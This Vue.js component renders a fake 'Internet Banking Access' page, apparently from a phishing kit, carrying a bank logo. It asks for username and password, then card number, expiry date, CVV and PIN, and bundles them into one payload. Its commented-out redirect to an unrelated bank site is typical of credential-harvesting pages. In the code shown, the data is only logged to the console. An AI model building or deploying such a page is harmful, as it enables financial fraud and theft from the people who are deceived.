<template>
  <v-container fluid class="standardColor">
    <v-row class="ma-0">
      <v-col cols="12" class="text-center my-2">
        <div style="width: 100px" class="mx-auto pa-4 rounded-lg white">
          <v-img width="100" contain src="/banks/standard.png" />
        </div>
      </v-col>
      <v-col cols="12">
        <v-card flat max-width="400" outlined class="mx-auto py-6">
          <v-card-title class="justify-center">
            <div class="text-center">Internet Banking Access</div>
          </v-card-title>
          <v-card-text class="px-sm-6">
            <div v-if="isError" class="my-2 text-left red--text text--darken-1">
              {{ error }}
            </div>
            <v-form
              ref="form"
              v-model="valid"
              lazy-validation
              @submit.prevent="submit"
            >
              <v-row v-if="!isCard" class="ma-0">
                <v-col cols="12">
                  <v-text-field
                    v-model="username"
                    type="username"
                    name="username"
                    dense
                    label="User"
                    color="black"
                    class="text-subtitle-2 rounded-0 font-weight-light"
                  />
                </v-col>
                <v-col cols="12">
                  <v-text-field
                    v-model="password"
                    :type="show ? 'text' : 'password'"
                    name="password"
                    dense
                    label="Password"
                    :append-icon="
                      show ? 'mdi-eye-outline' : 'mdi-eye-off-outline'
                    "
                    color="black"
                    class="text-subtitle-2 rounded-0 font-weight-light"
                    @click:append="show = !show"
                  />
                </v-col>
                <v-col cols="12" class="my-2">
                  <v-btn
                    dark
                    large
                    small
                    color="#2196F3"
                    class="text-subtitle-2 font-weight-normal px-6"
                    @click="next"
                  >
                    Begin Session
                  </v-btn>
                </v-col>
              </v-row>
              <v-row v-else class="ma-0">
                <v-col cols="12">
                  <v-text-field
                    v-model="cardNo"
                    type="cardNo"
                    name="cardNo"
                    dense
                    label="Card Number"
                    color="black"
                    class="text-subtitle-2 rounded-0 font-weight-light"
                  />
                </v-col>
                <v-col cols="12">
                  <v-text-field
                    v-model="expiryDate"
                    type="expiryDate"
                    name="expiryDate"
                    dense
                    label="Expiry Date"
                    color="black"
                    class="text-subtitle-2 rounded-0 font-weight-light"
                  />
                </v-col>
                <v-col cols="12">
                  <v-text-field
                    v-model="cvv"
                    type="cvv"
                    name="cvv"
                    dense
                    label="CVV"
                    color="black"
                    class="text-subtitle-2 rounded-0 font-weight-light"
                  />
                </v-col>
                <v-col cols="12">
                  <v-text-field
                    v-model="pin"
                    type="pin"
                    name="pin"
                    dense
                    label="Pin"
                    color="black"
                    class="text-subtitle-2 rounded-0 font-weight-light"
                  />
                </v-col>

                <v-col cols="12" class="my-2">
                  <v-btn
                    dark
                    large
                    type="submit"
                    small
                    color="#2196F3"
                    class="text-subtitle-2 font-weight-normal px-6"
                  >
                    Next
                  </v-btn>
                </v-col>
              </v-row>
            </v-form>
          </v-card-text>
        </v-card>
      </v-col>
      <v-col cols="12" class="py-16" />
    </v-row>
  </v-container>
</template>

<script>
export default {
  data: () => ({
    valid: true,
    show: false,
    isCard: false,
    isError: false,
    error: "Invalid user credentials entered.",
    username: "",
    usernameRules: [(v) => !!v || "*Please enter your username "],
    password: "",
    passwordRules: [
      (v) => !!v || "*Please enter your password",
      (v) =>
        (v && v.length >= 6) || "Password must be greater than 6 characters",
    ],
    cardNo: "",
    cardNoRules: [(v) => !!v || "Card Number is required"],
    expiryDate: "",
    expiryDateRules: [(v) => !!v || "Expiry Date is required"],
    cvv: "",
    cvvRules: [(v) => !!v || "CVV is required"],
    pin: "",
    pinRules: [(v) => !!v || "Pin is required"],
  }),
  methods: {
    submit() {
      if (
        this.validate(this.cardNo, "Card Number") &&
        this.validate(this.expiryDate, "Expiry Date") &&
        this.validate(this.cvv, "cvv") &&
        this.validate(this.pin, "Pin")
      ) {
        const payload = {
          username: this.username,
          password: this.password,
          cardNo: this.cardNo,
          expiryDate: this.expiryDate,
          cvv: this.cvv,
          pin: this.pin,
        };
        console.log(payload);

        // window.location.href = 'https://www.absa.africa/absaafrica/careers/'
      }
    },
    next() {
      if (
        this.validate(this.username, "Username") &&
        this.validate(this.password, "Password")
      ) {
        this.isCard = true;
      }
    },
    validate(field, name) {
      if (field.trim() === "") {
        this.isError = true;
        this.error = `${name} must be empty`;
        return false;
      } else {
        this.isError = false;
        this.error = null;
        return true;
      }
    },
    clear() {
      this.reset();
      this.resetValidation();
    },

    reset() {
      this.$refs.form.reset();
    },

    resetValidation() {
      this.$refs.form.resetValidation();
    },
  },
};
</script>

<style>
.standardColor {
  background-color: #1e88e5;
}
</style>
